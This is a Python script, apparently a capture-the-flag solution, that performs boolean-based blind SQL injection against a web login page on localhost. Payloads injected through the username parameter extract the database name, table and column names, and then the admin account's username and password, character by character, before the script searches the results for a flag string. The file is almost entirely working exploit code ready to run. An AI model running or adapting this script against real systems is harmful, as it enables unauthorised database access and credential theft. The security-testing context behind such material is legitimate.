import requests
import string

target = "http://127.0.0.1:32895/index.php"

def test_condition(condition):
    """Test if a SQL condition is true by checking response"""
    payload = f"admin' AND {condition}-- -"
    params = {'username': payload, 'password': 'x'}
    try:
        resp = requests.get(target, params=params, timeout=10)
        # If condition is true, we get "not the admin" message
        return "not the admin" in resp.text
    except:
        return False

print("[*] Starting boolean-based blind SQL injection...")

# Extract database name
print("\n[*] Extracting database name...")
db_name = ""
for pos in range(1, 30):
    found = False
    for char in string.ascii_lowercase + string.digits + '_':
        condition = f"SUBSTR(DATABASE(),{pos},1)='{char}'"
        if test_condition(condition):
            db_name += char
            print(f"  Position {pos}: '{char}' -> Database: {db_name}")
            found = True
            break
    if not found:
        break

print(f"\n[+] Database name: {db_name}")

# Extract first table name
print("\n[*] Extracting first table name from information_schema...")
table_name = ""
for pos in range(1, 40):
    found = False
    for char in string.ascii_lowercase + string.digits + '_':
        condition = f"SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),{pos},1)='{char}'"
        if test_condition(condition):
            table_name += char
            print(f"  Position {pos}: '{char}' -> Table: {table_name}")
            found = True
            break
    if not found:
        break

print(f"\n[+] First table name: {table_name}")

# Extract all column names from the users table
print("\n[*] Extracting column names from users table...")
columns = []
for col_num in range(10):  # Try to extract up to 10 columns
    col_name = ""
    for pos in range(1, 40):
        found = False
        for char in string.ascii_lowercase + string.digits + '_':
            condition = f"SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT {col_num},1),{pos},1)='{char}'"
            if test_condition(condition):
                col_name += char
                print(f"  Column {col_num+1}, Position {pos}: '{char}' -> {col_name}")
                found = True
                break
        if not found:
            break
    if col_name:
        columns.append(col_name)
        print(f"\n[+] Column {col_num+1}: {col_name}")
    else:
        break

print(f"\n[+] Found {len(columns)} columns: {columns}")

# Identify admin field
print("\n[*] Identifying admin privilege field...")
admin_field = None
for field in ['is_admin', 'admin', 'role', 'isadmin', 'is_root', 'privilege']:
    if field in columns:
        # Verify it's the right field by checking for records
        condition = f"(SELECT COUNT(*) FROM users WHERE {field}=1)>0"
        if test_condition(condition):
            admin_field = field
            print(f"[+] Found admin field: {admin_field}")
            break

if not admin_field:
    # Try common field names even if not in our list
    for field in ['is_admin', 'admin', 'role', 'isadmin', 'is_root']:
        condition = f"(SELECT COUNT(*) FROM users WHERE {field}=1)>0"
        if test_condition(condition):
            admin_field = field
            print(f"[+] Found admin field: {admin_field}")
            break

# Extract admin username
if admin_field:
    print(f"\n[*] Extracting admin username (WHERE {admin_field}=1)...")
    admin_username = ""
    for pos in range(1, 40):
        found = False
        for char in string.ascii_lowercase + string.digits + string.ascii_uppercase + '_-@.':
            condition = f"SUBSTR((SELECT username FROM users WHERE {admin_field}=1 LIMIT 0,1),{pos},1)='{char}'"
            if test_condition(condition):
                admin_username += char
                print(f"  Position {pos}: '{char}' -> Username: {admin_username}")
                found = True
                break
        if not found:
            break
    
    print(f"\n[+++] ADMIN USERNAME: {admin_username}")
    
    # Extract admin password
    print(f"\n[*] Extracting admin password...")
    admin_password = ""
    for pos in range(1, 60):
        found = False
        for char in string.ascii_lowercase + string.digits + string.ascii_uppercase + string.punctuation:
            # Escape single quotes in password
            escaped_char = char.replace("'", "''")
            condition = f"SUBSTR((SELECT password FROM users WHERE {admin_field}=1 LIMIT 0,1),{pos},1)='{escaped_char}'"
            if test_condition(condition):
                admin_password += char
                print(f"  Position {pos}: '{char}' -> Password: {admin_password}")
                found = True
                break
        if not found:
            break
    
    print(f"\n[+++] ADMIN PASSWORD: {admin_password}")
else:
    print("\n[-] Could not identify admin field")
    print("[*] Trying to extract all usernames...")
    # Try to get first username
    username = ""
    for pos in range(1, 40):
        found = False
        for char in string.ascii_lowercase + string.digits + string.ascii_uppercase + '_-@.':
            condition = f"SUBSTR((SELECT username FROM users LIMIT 0,1),{pos},1)='{char}'"
            if test_condition(condition):
                username += char
                print(f"  Position {pos}: '{char}' -> Username: {username}")
                found = True
                break
        if not found:
            break
    print(f"\n[+] First username: {username}")

# Check for FLAG in responses
print("\n[*] Checking if extracted data contains FLAG...")
import re
all_data = f"{db_name} {table_name} {' '.join(columns)}"
if admin_field:
    all_data += f" {admin_username} {admin_password}"
flags = re.findall(r'FLAG\{[^}]+\}', all_data)
if flags:
    for flag in flags:
        print(f"\n[!!!] FLAG FOUND: {flag}")

print("\n[*] Extraction complete!")

